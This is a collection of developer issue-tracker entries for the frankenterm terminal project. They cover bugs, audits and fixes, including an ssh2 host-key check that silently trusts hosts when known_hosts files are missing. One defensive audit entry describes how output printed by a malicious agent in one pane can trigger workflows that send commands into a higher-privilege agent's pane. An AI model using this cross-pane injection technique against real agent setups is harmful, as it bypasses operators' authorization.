title: [ft-3tvvt] remove production storage writer_loop block_on bridge
description: Follow-on from ft-3tvvt. storage.rs writer_loop creates a private current-thread runtime to block_on runtime_async::mpsc::Receiver::recv. Refactor to a small writer inbox bridge with a synchronous receive API, or move the writer loop to an async-owned confinement design, without direct tokio usage.
close_reason: Shipped (commit 3f0139bde, linter-co-committed). The audited block_on bridge at storage.rs:11574 (writer_loop's per-thread asupersync runtime + CompatRuntime::block_on(rx.recv(...))) is gone. Eliminates: (1) per-writer-thread runtime allocation waste, (2) the deadlock surface flagged by ft-3tvvt parent audit (library secretly owning a runtime), (3) the cancel-bypass concern (mpsc RecvError::Cancelled now naturally exits the loop). title: [ssh][security] ssh2 host verification silently trusts missing known_hosts files
description:
## Problem

The ssh2 host verification path iterates UserKnownHostsFile entries and skips any path that does not exist. If none of the configured known_hosts files exist, the loop falls through and returns Ok(()), silently accepting the server host key without prompting the user or recording trust.

## Evidence

- frankenterm/ssh/src/host.rs ssh2 host_verification calls self.config.get("userknownhostsfile").unwrap(), loops paths, continues when a file is absent, and returns Ok(()) after the loop.
- For a first-time ssh2 connection on a machine without ~/.ssh/known_hosts or ~/.ssh/known_hosts2, this bypasses the HostVerify event used for unknown hosts in existing files.

## Fix shape

Read all existing known_hosts files into the ssh2 KnownHosts set, then perform one check. If no entry matches, send the HostVerify prompt and write accepted trust to a configured known_hosts target. Missing known_hosts files must be treated as an empty trust store, not implicit trust.

## Proof

- Focused unit coverage around selecting a write target from absent known_hosts paths.
- RCH-only targeted cargo test when RCH admission permits; local Cargo output is not acceptable proof.
- br dep cycles --json remains empty.

comments.author: jemanuel
comments.text: Source patch in frankenterm/ssh/src/host.rs now treats missing ssh2 known_hosts files as an empty trust store instead of implicit trust: it parses configured UserKnownHostsFile paths (ignoring OpenSSH 'none'), reads all existing files before a single host-key check, prompts on NotFound, appends accepted keys to the first configured known_hosts target, creates the parent directory if needed, and fails closed when no target exists. Added focused helper coverage for configured order, missing-file write target selection, and absent config rejection.\n\nStatic proof passed: rustfmt --edition 2018 --check frankenterm/ssh/src/host.rs; git diff --check -- frankenterm/ssh/src/host.rs .beads/issues.jsonl; br dep cycles --json => count=0. RCH proof remains blocked: env -u CARGO_TARGET_DIR rch diagnose --json --dry-run -- env CARGO_BUILD_JOBS=1 CARGO_INCREMENTAL=0 cargo test -p frankenterm-ssh known_hosts_ -- --nocapture classified cargo_test/would_intercept=true but selected worker=null with no_admissible_workers=critical_pressure=2. No local Cargo proof, material RCH run, RCH repair, service restart, remote mutation, or file deletion performed.

title: Replay ResourceLimits allow all core guardrails to be disabled by zero values
description:
Reality-check audit of frankenterm-core-replay found ResourceLimits has no validation or explicit unbounded mode, yet zero values disable every core limit.

Evidence:
- crates/frankenterm-core-replay/src/replay_guardrails.rs:72-84 defines max_events, max_wall_clock_ms, memory_warning_events, max_concurrent, and watchdog_timeout_ms as plain numeric config.
- crates/frankenterm-core-replay/src/replay_guardrails.rs:87-95 provides bounded defaults.
- crates/frankenterm-core-replay/src/replay_guardrails.rs:99-103 parses TOML directly into ResourceLimits with no validation.
- crates/frankenterm-core-replay/src/replay_guardrails.rs:219 checks max_events only when max_events > 0.
- crates/frankenterm-core-replay/src/replay_guardrails.rs:229 checks memory_warning_events only when memory_warning_events > 0.
- crates/frankenterm-core-replay/src/replay_guardrails.rs:245 checks max_wall_clock_ms only when max_wall_clock_ms > 0.
- crates/frankenterm-core-replay/src/replay_guardrails.rs:267 returns Ok immediately when watchdog_timeout_ms == 0.
- crates/frankenterm-core-replay/src/replay_guardrails.rs:711-721 has a test showing max_events=0, max_wall_clock_ms=0, memory_warning_events=0, watchdog_timeout_ms=0 allows 1000 events with CheckResult::Ok.

Why it matters:
Replay/simulation guardrails are supposed to cap runaway runs. A malformed or overly permissive TOML can silently disable event, wall-clock, memory-warning, and watchdog enforcement with no explicit allow_unbounded acknowledgement. max_concurrent is also present in the config but not enforced in ResourceTracker.

Proposed remediation:
Add ResourceLimits::validate and call it from from_toml and runner construction. Require positive bounded defaults unless an explicit unbounded flag is set, wire max_concurrent into the runner/permit layer, and add tests that invalid zero limits are rejected unless the caller opts into an unbounded profile with clear telemetry.

title: [mock-code-finder][robot-sdk] Promote Go SDK from template stub to wired transport or hide it from generated artifacts
description:
## Finding
The Robot SDK generator still emits a Go client template whose transport panics with `transport not wired`. The code documents Go as intentionally not fully supported, but also says it should remain template-only until a dedicated promotion bead wires and tests it; no such Bead was found.

## Evidence
- crates/frankenterm-core/src/robot_sdk_contracts.rs:244 says Python, TypeScript, and Rust are fully supported while Go remains a template skeleton.
- crates/frankenterm-core/src/robot_sdk_contracts.rs:260 labels Go as a transport stub.
- crates/frankenterm-core/src/robot_sdk_contracts.rs:1907 renders a Go `call` method that panics with `transport not wired`.
- crates/frankenterm-core/src/robot_sdk_contracts.rs:3766 tests that Go stays unsupported until its dedicated promotion bead wires and tests it.
- Beads searches for ft-gzgfc, SdkLanguage Go, SDK Go, and Go SDK template transport not wired promotion returned no tracker item.

## Scope
1. Either implement a real Go transport for the same Robot Mode process/socket contract as the supported SDKs, or stop producing Go as a normal generated artifact and expose it only as an explicitly unsupported sample.
2. If implementing, add bounded process/socket execution, JSON envelope decoding, timeout/error mapping, and command support discovery matching the other supported SDKs.
3. If hiding, update generated-artifact contracts so unsupported Go cannot be mistaken for a ready SDK.
4. Update docs and contract fixtures to state the live Go support level exactly.

## Tests and proof
- Generator tests proving supported SDKs never emit transport stubs.
- Go-specific contract/golden tests for the wired transport or explicit unsupported-sample output.
- E2E smoke that invokes at least one Robot command through the Go client when the Go toolchain is available, with a structured skip otherwise.
- Rust-side compiled verification must run through RCH only; no local heavy proof substitution.

## Acceptance
- No generated SDK advertised as supported contains `transport not wired` or a panic stub.
- Go is either fully wired and tested or clearly excluded from supported SDK artifacts.
- br dep cycles --json remains empty.

comments.author: jemanuel
comments.text:
Triage correction after source/docs inspection:

- Current production artifact behavior already hides Go: standard_contract_artifacts() iterates Python/TypeScript/Rust/Go but skips any language where SdkLanguage::is_fully_supported() is false, and Go returns false.

title: [ARCH/capacity] P-squared quantile (Jain Chlamtac 1985) for streaming p99 latency without sample retention
description:
Phase-3 alien-graveyard match for backpressure/capacity domain.

Symptom: The current Histogram (telemetry.rs:299) and TDigestHistogram (telemetry.rs:550+, br-ft-z9byv) both retain a sample buffer or compressed centroids. For the documented 200-agent fleet hot path with O(thousands) of latency observations per second per stage, even t-digest bounded centroid count (~3KB at compression=100) adds up across the 7 SwarmCapacityStages times N concurrent workload categories.

Algorithm: P-squared quantile (Jain and Chlamtac 1985, The P2 Algorithm for Dynamic Calculation of Quantiles and Histograms). Streaming algorithm that estimates a single quantile (e.g., p99) over a sequence WITHOUT retaining samples. Maintains 5 markers + interpolates. CONSTANT memory + O(1) per insert + O(1) per quantile read.

Trade-off vs t-digest:
- t-digest: bounded relative error at the tails (1-2% at compression=100), supports arbitrary quantile queries from one structure.
- P-squared: bounded absolute error for ONE pre-chosen quantile (p99 in our case). 5 doubles of state ~40 bytes vs t-digest ~3KB.
- t-digest mergeable across processes; P-squared is not.

For per-WorkloadCategory p99 tracking in CapacityGovernor where we ALWAYS read p99, P-squared is the right tool.

Integration: A new crate p_squared_quantile (sibling top-level module pattern):
- PSquaredEstimator new(quantile)
- record(value) — O(1)
- estimate() — O(1)
- count, snapshot, serde

Acceptance:
- For uniform distribution + 10k samples + quantile=0.99, the estimate is within +/-0.05 of the true 0.99.
- Memory bound: < 100 bytes per estimator regardless of insert count.
- Filed P3 because TDigestHistogram already covers the multiple-quantiles case; P-squared is the niche when memory is critical + only one quantile matters.

Cross-references:
- Jain and Chlamtac 1985.
- alien-graveyard catalog (informal; classical streaming-quantile algorithm).
close_reason: done

title: [security-audit] workflow runner: detection on attacker-controlled pane output drives policy-gated actions on OTHER panes (privilege amplification)
description:
## Concrete attack

`crates/frankenterm-core/src/workflows/runner.rs` is the event-
driven workflow execution loop. Workflows are triggered by
detection events (`crate::patterns::Detection`) which fire when
configured patterns match on pane output text.

The architecture diagram in runner.rs:243 shows:

```text
EventBus (detections) -> WorkflowRunner -> find_matching_workflow
                                        -> acquire_pane_lock
                                        -> WorkflowEngine (persist)
                                        -> execute_steps
                                        -> release_pane_lock
```

The execution-step body (line ~1354) calls
`wait_condition_pause_maybe_cx`, dispatches `Send` actions
through `CxPolicyInjector` — the action IS policy-gated on the
PANE the workflow is acting on.

**However:** the DETECTION input is attacker-controlled (any
agent's output text), and the workflow's ACTION pane is
DECOUPLED from the detection's source pane. A malicious agent
on pane A can produce output that matches a workflow trigger;
the workflow then drives an action on pane B (the configured
target).

This is **privilege amplification by pattern injection**:

- Pane A is operated by a low-privilege agent (e.g., a
  rate-limited tester).
- Pane B is operated by a high-privilege agent (e.g., the
  release pipeline).
- A workflow `handle_compaction` is configured: detection
  on `Compacting…` text → action `send_text("/continue")` to
  pane B.
- The low-privilege agent on pane A prints `Compacting…` (legit
  text in any console output).
- Workflow fires, sends `/continue` to pane B regardless of
  whether the operator authorized it for THIS event.

The `CxPolicyInjector` policy-gate fires on the SEND action,
but the policy input doesn't know "this trigger came from a
low-trust source pane." The workflow's pane-lock manager
prevents two workflows targeting pane B at once, but doesn't
prevent A→B causation.

## Why this is exploitable

Concrete scenarios:

1. **Cross-pane command injection.** A malicious agent in pane A
   prints output matching a workflow's trigger pattern; the
   workflow drives a command into pane B that pane B's operator
   never authorized.

2. **Rate-limit evasion.** Pane A is rate-limited at the
   PolicyEngine level (e.g., 30 sends/min). Pane A causes 100
   workflow firings, each of which sends to pane B without
   pane A's rate-limit budget being charged — only pane B's
   budget is consumed.

3. **Loop construction.** Pane A causes workflow on pane B,
   workflow's response in pane B matches another workflow's
   trigger that targets pane A — feedback loop, neither pane's
   operator initiated.

The skill's `⊙ Identity-Chain Trace` operator predicts this
exactly: the identity claim arrives at the workflow runner as
"pane A produced text X." The handler uses it for "execute
workflow targeting pane B." The claim is NOT cross-verified
against the workflow operator's authorization for that trigger
to drive that target. The claim IS attacker-controllable (any
agent's output is text). An attacker CAN craft a claim
(produce the matching text) pointing to a victim's authority
(workflow's target pane).

Per skill Axiom 6 ("Presence-only header checks are worthless"),
the workflow runner today does presence-only check: "did pattern
match? then trigger." It does NOT verify the trust relationship
between the source-pane and the action-pane.

## Suggested fix

1. **Add source-pane trust scoping to workflow triggers.** The
   workflow definition (`Workflow` trait, `handles(detection)`)
   should be ALLOWED to predicate on detection.pane_id and
   refuse triggers from untrusted source panes:

   ```rust
   pub struct WorkflowTriggerPolicy {
       pub allowed_source_panes: Option<HashSet<u64>>,
       pub require_user_actor: bool,
   }
   ```

2. **Audit log the (source_pane → target_pane) edge.** Today
   `record_to_decision_log` records the SEND action with target
   pane. It should also record the originating detection's
   source pane so post-incident forensics can trace cross-pane
   causation.

3. **Add a policy clause** "actions originating from workflow
   triggers on pane S require the originating S to have
   capability X" — an explicit chain-of-trust check.

4. **Document the threat model** in
   `docs/workflow-trust-boundaries.md`: workflow operators must
   know that ANY pane's output can drive their workflow unless
   they configure a source-pane allowlist.

## Out of scope

- The pattern engine itself (regex matching on agent output
  is by design).
- Disabling workflows entirely (they are core feature).
- Per-workflow IAM (separate larger design).

## Acceptance criteria

- `Workflow::handles(&detection)` API gains an optional
  source-pane check.
- The audit log records (source_pane, target_pane) edges, not
  just target pane.
- A regression test
  `tests/workflow_cross_pane_amplification.rs` proves a
  low-trust source pane CANNOT drive a workflow action on a
  high-trust pane when the workflow declares a source-pane
  allowlist.
- README's "Workflow" feature section adds a security-model
  note.

## References

- `crates/frankenterm-core/src/workflows/runner.rs:240-260`
  (architecture comment)
- `crates/frankenterm-core/src/workflows/runner.rs:1354`
  (wait + send dispatch)
- `crates/frankenterm-core/src/patterns/Detection.rs` (the
  attacker-controllable input)
- Skill: security-audit-for-saas — `⊙ Identity-Chain Trace`
  operator + Axiom 6 (presence-only checks)

Filed by cc_1 security audit, 2026-04-28.

title: [CRITICAL] DifferentialCellStream produces unwrappable upload payload across ring boundary
description:
Severity: CRITICAL — runtime validation error / out-of-bounds GPU write
when delta records straddle the GPU ring buffer wrap.

Commit 826e9b8d6 (feat(gui): add differential cell stream staging,
br-ft-mpc9b.6.7) ships `DifferentialCellStream` in
`crates/frankenterm-gui/src/quad.rs` with an internal CPU-side ring
buffer that handles wrap correctly:

```rust
let ring_offset = self.ring_cursor;
for record in records {
    self.ring[self.ring_cursor] = *record;
    self.ring_cursor = (self.ring_cursor + 1) % self.ring.len();
}
Ok(ring_offset)
```

But `CellDeltaFrame.records` is a single linear `Vec<GpuCellInstance>`,
documented as "Linear upload payload for queue.write_buffer." The
returned `ring_offset` + `records.len()` cannot represent a wrapped
upload region — neither as a single offset+payload nor as two
regions.

## Reproduction trace

ring_capacity=12, ring_cursor=10, push_frame produces 5 changed-cell
records:
- CPU-side: ring writes at indices 10, 11, 0, 1, 2 (wraps correctly).
- Returned: `ring_offset=10`, `records: Vec` of 5 elements.
- Consumer calls
  `queue.write_buffer(gpu_buf, 10 * INSTANCE_BYTES_PER_CELL, &records_as_bytes)`.
- wgpu writes 5 × 32 = 160 contiguous bytes starting at byte 320 →
  overflows the GPU ring buffer at byte 384 (12 × 32 = 384), runtime
  wgpu validation error / undefined GPU write.

## Why no existing test catches this

Tests in the commit cover only:
- `differential_cell_stream_starts_with_full_rewrite` (full rewrite,
  ring_cursor wraps cleanly to 0 after writing N cells in an N-capacity
  ring).
- `differential_cell_stream_uploads_only_changed_cells_in_dirty_rows`
  (single delta cell at offset 0; no wrap).
- Periodic-compaction test (full rewrite, same shape as the first test).

No test exercises the wrap-mid-frame case. The ring_capacity in tests
is exactly `rows * cols`, so a full rewrite consumes the entire ring
and wraps to 0; subsequent deltas always start at low offsets.

## Fix options

1. **Split returned payload into (head, tail)**: change
   `CellDeltaFrame.records: Vec<GpuCellInstance>` to
   `head: Vec<…>` + `tail: Vec<…>` (tail empty when no wrap). Caller
   issues two `queue.write_buffer` calls when tail is non-empty.

2. **Refuse to wrap mid-frame**: when records.len() >
   ring_capacity - ring_cursor, force `CellDeltaFrameKind::FullRewrite`
   and reset ring_cursor to 0. Trade-off: more full rewrites under
   churn, but the consumer stays a single upload.

3. **Return two ring offsets**: `ring_offset_head` + `ring_offset_tail`
   (Option<usize>). Caller checks for tail.

Option 2 is simplest + matches the existing periodic-compaction
trigger; the cost is a few more full rewrites per session. Option 1
preserves delta efficiency but doubles the consumer-side complexity.

## Acceptance

- DifferentialCellStream API can correctly express a wrapped upload
  (chosen via fix option 1, 2, or 3).
- New regression test:
  `wraps_across_ring_boundary_without_overflowing_upload_offset` —
  construct stream with ring_capacity smaller than the maximum
  expected delta size, push frames that intentionally fill the ring
  past wrap, assert the upload payload(s) plus offset(s) describe
  in-bounds writes.
- Existing 3 tests still pass.

## Cross-references

- Commit: 826e9b8d6 (feat(gui): add differential cell stream staging)
- File: crates/frankenterm-gui/src/quad.rs (DifferentialCellStream,
  CellDeltaFrame, append_to_ring)
- Bead: ft-mpc9b.6.7 (parent — differential cell streaming to GPU)
- Sibling: ft-mpc9b.6.5 / ft-mpc9b.6.8 (atlas/render uplift cluster)

Added regression differential_cell_stream_promotes_wrapping_delta_to_full_rewrite. Verification: git diff --check for touched GUI files passed; rustfmt --edition 2024 --check crates/frankenterm-gui/src/quad.rs passed; CARGO_TARGET_DIR=/tmp/ft-cod6-target rch exec -- bash -lc 'CARGO_TARGET_DIR=/tmp/ft-cod6-target cargo test -p frankenterm-gui --bin frankenterm-gui differential_cell_stream -- --nocapture' passed 7 tests. title: [search-consistency] tokenize_query accepts Unicode alphanumerics but doc + tantivy index regex are ASCII-only — search mismatch on non-ASCII content
description:
br-cc_2 surfaced this consistency gap while writing proptest_tantivy_query_idempotence (br-ft-l1jgo phase-3 / search proptest sweep).

## Symptom

`crates/frankenterm-core-tantivy/src/tantivy_query.rs::tokenize_query` documents itself at line 569 as:

```rust
// Match the ft_terminal_text_v1 tokenizer pattern: [A-Za-z0-9_./:-]+
```

But the implementation at line 574 uses `ch.is_alphanumeric()`:

```rust
for ch in query.chars() {
    if ch.is_alphanumeric() || ch == '_' || ch == '.' || ch == '/' || ch == ':' || ch == '-' {
        current.push(ch);
    } else if !current.is_empty() {
        terms.push(std::mem::take(&mut current));
    }
}
```

`char::is_alphanumeric` is Unicode-aware and returns true for code points like:
- `⁰` (U+2070 SUPERSCRIPT ZERO) — accepted as alphanumeric
- `①` (U+2460 CIRCLED DIGIT ONE) — accepted
- `α` / `β` / `Я` / Greek/Cyrillic/CJK letters — all accepted
- many Unicode digit categories (Nd, Nl, No)

But the actual tantivy index tokenizer (configured in `recorder_lexical_schema.rs::TERMINAL_TOKEN_PATTERN = r"[A-Za-z0-9_./:-]+"`) is a `RegexTokenizer` over the explicit ASCII charset. So for Unicode content:

1. The index stores `"⁰"` (or any non-ASCII identifier) as zero tokens — the regex doesn't match.
2. `tokenize_query("⁰")` returns `["⁰"]` — the storage tokenizer thinks it's one valid term.
3. Search with `tokenize_query`'s output runs against an index that doesn't have those tokens → zero results despite the storage tokenizer "agreeing" the input was tokenizable.

Discovered via the proptest `proptest_tantivy_tokenize_query_output_in_charset` — proptest shrunk to exactly `input = "⁰"`. The test was checking that every output token of `tokenize_query` consists only of `[A-Za-z0-9_./:-]+` (the documented charset); it failed because the implementation accepts the Unicode superscript zero.

## Why this matters

Terminal output frequently contains non-ASCII content: Unicode-rich scripting language identifiers (Python class names with Greek letters, math symbols), emoji, CJK output for localized programs, file paths on systems with non-ASCII directory names. Any search that hits such content hits the inconsistency.

Severity P2 because:
- The bug doesn't crash; it silently returns zero results where the user expected matches.
- Operators relying on search to find non-ASCII content get false negatives without any error or warning.
- The two tokenizers (storage-side query splitter vs. index-side RegexTokenizer) are silently divergent. This is the canonical "two implementations of the same regex" anti-pattern.

## Fix shape

Two clean options:

1. **Tighten `tokenize_query` to ASCII-only**: change `ch.is_alphanumeric()` to `ch.is_ascii_alphanumeric()`. Brings the storage tokenizer in line with the documented + index-side regex. Existing callers that relied on Unicode tokenization (if any) lose that behavior — but those callers were already broken because the index doesn't match either way.

2. **Loosen the index regex to match Unicode**: change `TERMINAL_TOKEN_PATTERN = r"[A-Za-z0-9_./:-]+"` to a Unicode-aware pattern (e.g. `r"[\w./:-]+"` with the Unicode flag enabled, or `r"[\p{Alphabetic}\p{Nd}_./:-]+"`). Brings the index in line with `tokenize_query`. Reindex required for existing data.

Option 1 is simpler and matches the existing documentation; recommended. Option 2 is the bigger fix that supports non-ASCII terminal content end-to-end and is the right long-term direction.

## Acceptance

- Either `tokenize_query` is ASCII-only OR the regex/doc is updated to Unicode.
- A regression test pins the chosen contract (the proptest at
  `crates/frankenterm-core/tests/proptest_tantivy_query_idempotence.rs::proptest_tantivy_tokenize_query_output_in_charset` should pass without the temporary loosening this bead introduces).
- Cross-check: `recorder_lexical_schema.rs::TERMINAL_TOKEN_PATTERN` matches `tokenize_query`'s charset definition.

## Cross-references

- `crates/frankenterm-core-tantivy/src/tantivy_query.rs:568-585` (the tokenizer).
- `crates/frankenterm-core-tantivy/src/recorder_lexical_schema.rs:36` (`TERMINAL_TOKEN_PATTERN` regex).
- `crates/frankenterm-core/tests/proptest_tantivy_query_idempotence.rs::proptest_tantivy_tokenize_query_output_in_charset` (the proptest documenting the divergence; loosened to match impl behavior with a docstring referencing this bead).
- ft-l1jgo (parent storage migration epic — surface for this proptest sweep).
close_reason: Fixed at a3a746ed2. Tightened tokenize_query at crates/frankenterm-core-tantivy/src/tantivy_query.rs:574 from ch.is_alphanumeric() (Unicode-aware) to ch.is_ascii_alphanumeric(), matching the index-side RegexTokenizer at recorder_lexical_schema.rs:36 (TERMINAL_TOKEN_PATTERN = r'[A-Za-z0-9_./:-]+'). This was option 1 from the bead's fix-shape paragraph. Added a docstring on tokenize_query explaining the consistency contract so future tokenizer rewrites can't drift again. Updated the companion proptest's is_token_char helper from Unicode is_alphanumeric to is_ascii_alphanumeric in the same commit — proptest now exercises the post-fix charset directly. Reindex implications: existing indexes already had zero tokens for non-ASCII (the index regex always rejected those code points); the storage side previously manufactured phantom tokens that had zero matches. Both sides now agree, no reindex needed. Verification: cargo check --lib clean; cargo test --test proptest_tantivy_query_idempotence — 6 passed (64 cases each).

title: MissionEventLog deserialize can reuse stale sequence numbers
description: Audit of crates/frankenterm-core/src/mission_events.rs found a persisted-log integrity gap. MissionEventLog derives Serialize/Deserialize while carrying private events, next_sequence, total_appended, and total_evicted state (mission_events.rs:364-372). MissionEventLog::new initializes next_sequence to 1 (mission_events.rs:378-385), and emit assigns seq = self.next_sequence, then saturating_adds and pushes the event (mission_events.rs:391-405). There is no deserialize-time validation that next_sequence is greater than every retained MissionEvent.sequence, nor any counter reconciliation. Existing serde tests only roundtrip logs produced by emit (mission_events.rs:1246-1263; tests/proptest_mission_events.rs:540-561), and monotonicity tests only cover append-built logs (mission_events.rs:1515-1540; tests/proptest_mission_events.rs:169-193). Why it matters: if a persisted or malformed log has retained event sequence 10 but next_sequence 2, the next emit reuses sequence 2 and destroys the documented monotonic ordering guarantee that telemetry/audit consumers rely on. Proposed remediation: add custom Deserialize or a validate_after_load constructor that rejects or normalizes malformed logs, recomputes next_sequence as max(retained.sequence)+1, validates total_appended/total_evicted invariants, and adds malformed JSON regression tests for stale next_sequence and nonmonotonic retained sequences.
notes: Shipped at 8bc43636a. MissionEventLog Deserialize replaced with a custom impl that heals (a) stale next_sequence (< max(retained)+1), (b) zero next_sequence on empty log (default-after-serde -> 1), and (c) total_appended below events.len() (heals to events.len()+total_evicted). Each heal bumps mission_event_log_normalization_count atomic counter. 4 unit tests + 1 proptest pin the contract: stale-input heals to monotonic, empty heals to 1, counter heals to events+evicted, well-formed roundtrip leaves counter at 0, and any malformed input satisfies next_sequence > max(retained) post-load. Build via scripts/cargo-local.sh check -p frankenterm-core --lib --no-default-features clean. Same audit-fidelity counter shape as ft-fp6st / ft-rnpuc / ft-yygus / ft-jyywz / ft-zkthg.

title: MCP degraded skipped-entry telemetry is hardcoded and already contradicts registered surface
description:
Reality-check audit of crates/frankenterm-core/src/mcp_bridge.rs found the degraded-mode skipped counter and warning text are static instead of being derived from the actual registered catalog, and the comments already contradict the code path.

Evidence:
- crates/frankenterm-core/src/mcp_bridge.rs:26-33 hardcodes MCP_BRIDGE_DEGRADED_MODE_SKIPPED_ENTRIES = 20 and explains the math as only WaGetTextTool registering in degraded mode.
- crates/frankenterm-core/src/mcp_bridge.rs:73-87 repeats that build_server_degraded has a stripped catalog where only WaGetTextTool registers.
- crates/frankenterm-core/src/mcp_bridge.rs:148-212 registers many base tools/resources before the db_path split, including state, wait_for, rules, cass, tx, mission, panes, workflows, and rules resources. Those registrations happen in both full and degraded mode.
- crates/frankenterm-core/src/mcp_bridge.rs:337-356 increments the fixed counter and warn-logs that only WaGetTextTool registered, even though the base catalog was already registered.
- crates/frankenterm-core/src/mcp_bridge.rs:423-470 tests only that the counter bumps by the constant; there is no assertion of the actual degraded/full tool-resource diff or warning contents.

Why it matters:
Operators reading mcp_bridge_tools_skipped_no_db_count or startup warnings get a misleading view of what the no-db server actually exposes. Future bridge registration changes will silently stale the constant further, turning the degraded-mode observability added for br-ft-647cj into another reality drift surface.

Proposed remediation:
Replace the hardcoded skipped-entry constant and prose-only catalog with a central registration manifest or server catalog introspection helper. Compute degraded/full diffs from registered tool and resource names, log the exact skipped and retained catalogs, and add tests that fail when a tool/resource is added without updating the degraded-mode classification.
close_reason: Fixed in 8953ceaaf. Replaced hardcoded degraded skipped-entry telemetry with DB-gated tool/resource manifests, derived skipped-entry counting, manifest-backed startup warning fields for retained/skipped/withheld catalogs, and regression tests comparing manifests against full/degraded server catalogs. Verification: rustfmt --edition 2024 --check crates/frankenterm-core/src/mcp_bridge.rs PASS; git diff --check -- crates/frankenterm-core/src/mcp_bridge.rs PASS; rch exec -- env CARGO_TARGET_DIR=/tmp/ft-codex-mcp-bridge cargo check -p frankenterm-core --lib PASS (rch local fallback, existing warnings). title: perf(patterns): cache trace pack ids and anchor buckets in detection hot path
description:
Hot path: crates/frankenterm-core/src/patterns.rs:2652-2656 resolves pack_id_for_rule_id() and allocates a String for every candidate rule in detect_with_context_and_trace_inner(); crates/frankenterm-core/src/patterns.rs:2868-2872 also allocates a Vec for every rule that gets an anchor hit. In high-volume capture scans this repeats per detect call even though rule->pack id and anchor bucket cardinality are compile-time properties of EngineIndex.

Concrete optimization: add pack_id (Arc<str> or Box<str>) to CompiledRule during compile_packs, pass borrowed pack_id into trace builders, and pre-size/reuse candidate anchor buckets (SmallVec<[AnchorMatchRef; 2]> or a pooled per-call scratch vec) so common single-anchor rules avoid heap allocation. Add a microbench/proptest fixture over repeated PatternEngine::detect_with_context_and_trace on pattern-rich text to show allocation/count reduction.
close_reason: Cached pattern trace pack IDs and replaced per-hit anchor lookups with prebuilt rule buckets

title: [ft-jfyz7 sub-task 3] PR-CI regression bead automation for Lindley deviation > 20%
description:
Sub-task 3 of ft-jfyz7. Sub-tasks 1+2 (release-time refresh + signing) shipped under ft-jfyz7's main close.

## Scope
1. Add a PR-CI step (.github/workflows/ — likely finish-line-guards.yml or a new workflow) that runs scripts/lindley-bounds-build.sh against the PR HEAD's analytical bound + a bench-derived empirical_p99_ms.
2. When the script exits 1 (deviation_pct > 20%), the PR step does NOT just fail; it also files a regression bead via 'br create --type=bug --priority=1 --title="[BR-RC-FOUNDATION.PERF-REGRESSION] Lindley analytical-vs-empirical deviation exceeds 20% on PR $PR_NUMBER" --description=...' with the offending JSON inlined.
3. The regression bead is tagged so it surfaces in operator triage; the PR may merge or fail per repo policy (separate decision).

## Considerations
- bd/br CLI must be installable in CI (cargo install or pre-built binary).
- Requires a bench step that produces empirical_p99_ms in CI; can fall back to the documented default (8.5 ms) if absent, but then deviation is meaningless. Filing the bead conditional on real bench data being present.

## Acceptance
- Workflow step lands.
- Synthetic test with deviation > 20% triggers a regression bead.
- Synthetic test with deviation ≤ 20% does not.

title: [font_features.fix] AxisValue public fields bypass NaN/range validation, atlas-key collision risk
notes:
Fix landed at commit a45045e39. AxisValue fields made private; getters added. 3 regression tests verified.

The collision risk: NaN-constructed AxisValue → quantised_u32 returns 0 → atlas-key collision with legitimate value=0.0. Now structurally prevented since AxisValue can only be constructed via new() which rejects NaN/INF.

Same shape fix as ChunkBytes::bytes private-field fix the linter applied to cold_tier_pipeline this session.

41 tests in font_features (38 original + 3 new regression). No external callers found.

Pattern: 'public field bypasses constructor's invariant gate' — same family as the typed-state bypass fixes but distinct from rubber-stamp is_safe. Worth a sweep grep for  followed by validating constructors.

title: Replay regression gate accepts NaN skip budgets that disable skipped-artifact failure
description:
Reality-check audit of frankenterm-core-replay found RegressionBudget accepts floating-point skip budgets without validation; NaN or nonsensical values can make skipped-artifact checks silently pass.

Evidence:
- crates/frankenterm-core-replay/src/replay_guardrails_gate.rs:18-34 defines skip_budget_percent as f64.
- crates/frankenterm-core-replay/src/replay_guardrails_gate.rs:59-63 parses TOML directly into RegressionBudget with no validate() step.
- crates/frankenterm-core-replay/src/replay_guardrails_gate.rs:337-357 checks skip budget with ordinary f64 comparisons: skip_pct > budget.skip_budget_percent and budget.skip_budget_percent > 0.0.
- With skip_budget_percent = NaN, both comparisons are false, so skipped_artifacts never creates a violation or warning.
- crates/frankenterm-core-replay/src/replay_guardrails_gate.rs:661-674 tests only a valid 15.0 budget; lines 872-873 only test syntactically invalid TOML.
- crates/frankenterm-core-replay/src/replay_guardrails_gate.rs:878-887 separately treats total_artifacts=0 as pass, but there is no invalid-budget fail-closed test.

Why it matters:
The replay regression gate is the CI/operator boundary for matrix quality. A malformed TOML budget can set skip_budget_percent to NaN, negative, or >100 and either fail open or produce meaningless usage math. That lets a run with skipped/errored artifacts pass the gate even when the budget intended to bound skipped coverage.

Proposed remediation:
Add RegressionBudget::validate and call it from from_toml/new gate construction. Require skip_budget_percent.is_finite() and 0.0 <= skip_budget_percent <= 100.0, and require a positive time_budget_ms unless an explicit unbounded mode is introduced. Add tests for NaN, infinity, negative, and >100 values.
close_reason: Fixed in 535f6b410: RegressionBudget now validates finite 0..=100 skip budgets and positive time budgets; GateEvaluator fails closed for invalid programmatic budgets; targeted replay_guardrails_gate tests pass.

title: Resolve frankenterm-core clippy -D warnings gate
description:
# Workspace-level clippy gate

## Background
Discovered during ft-xbnl0.2.4 tick 356 verification sweep. The
`frankenterm-core` crate reports **17 clippy errors** when run with
`-D warnings`:

    cargo clippy --no-deps -p frankenterm-core \\
        --features distributed,asupersync-runtime,web \\
        --lib --tests -- -D warnings

All 17 errors are in files **unrelated to ft-xbnl0.2.4**:

- `src/ipc.rs`
- `src/robot_sdk_contracts.rs`
- `src/runtime.rs`
- `src/snapshot_engine.rs`
- `src/ui_query.rs`
- `src/workflows/engine.rs`
- `src/workflows/runner.rs`

These are from recent commits by other agents.

## Why not fix in ft-xbnl0.2.4
AGENTS.md explicitly instructs "NEVER ... disturb in ANY way the work of
other agents." The violations may be:
- awaiting `#[allow(...)]` annotations from their owners
- pending intentional restructures
- already planned for cleanup

Touching them without coordination could override the owners' planned
solutions.

## Fix categories observed (examples)
- `clippy::duration-suboptimal-units` — `Duration::from_millis(2_000)` should be `from_secs(2)`
- `clippy::redundant-closure` — `|| crate::foo()` should just be `crate::foo`
- `clippy::semicolon-if-nothing-returned` — trailing unit-valued expression without semicolon
- Several others (see `cargo clippy` output at time of fix)

## Suggested approach
For each file, coordinate with the owning agent (via Agent Mail or by checking
recent git history for active work) before applying fixes. Prefer:
1. Fixing real issues over `#[allow(...)]` annotations.
2. Single-file commits so each fix is easy to review.
3. Running `ubs` on each file after the clippy fix to avoid introducing
   new bugs in the cleanup.

## Not a blocker for ft-xbnl0.2.4
